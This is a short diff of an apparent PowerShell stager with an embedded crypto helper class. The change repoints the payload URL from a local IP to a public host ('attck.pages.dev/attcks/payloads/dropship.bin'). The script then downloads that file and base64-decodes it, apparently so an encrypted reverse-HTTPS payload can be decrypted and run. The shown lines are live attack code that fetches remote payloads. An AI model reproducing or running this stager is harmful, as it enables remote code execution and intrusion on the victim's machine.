@@ -31,7 +31,7 @@ public static class CryptoHelper
 "@ -ErrorAction Stop
 
 # Define URL of the web-hosted .txt file containing base64 encrypted string
-$url = "http://192.168.1.172/files/attck-rev-https-aes.txt"
+$url = "https://attck.pages.dev/attcks/payloads/dropship.bin"
 
 # Download the file and decode it into a byte array
 $byteString = [System.Net.WebClient]::new().DownloadData($url) | ForEach-Object { [Convert]::FromBase64String($_) }
